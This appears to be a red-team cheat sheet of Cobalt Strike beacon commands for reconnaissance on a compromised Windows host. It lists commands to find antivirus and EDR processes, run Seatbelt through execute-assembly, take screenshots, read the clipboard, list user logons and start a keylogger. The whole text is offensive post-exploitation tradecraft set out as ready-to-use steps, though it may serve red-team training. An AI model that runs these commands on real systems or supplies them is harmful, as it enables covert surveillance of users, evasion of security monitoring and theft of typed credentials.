# Host Reconnaissance

# Identify running process like AV, EDR or any monitoring and logging solution

    beacon> ps

# Use Seatbealt to enumerate about system

    beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system

# Screenshot, Clipboard, Keylogger and User Sessions of currently logged in user

    beacon> screenshot
    beacon> clipboard
    beacon> net logons

    beacon> keylogger
    beacon> job
    beacon> jobkill 3
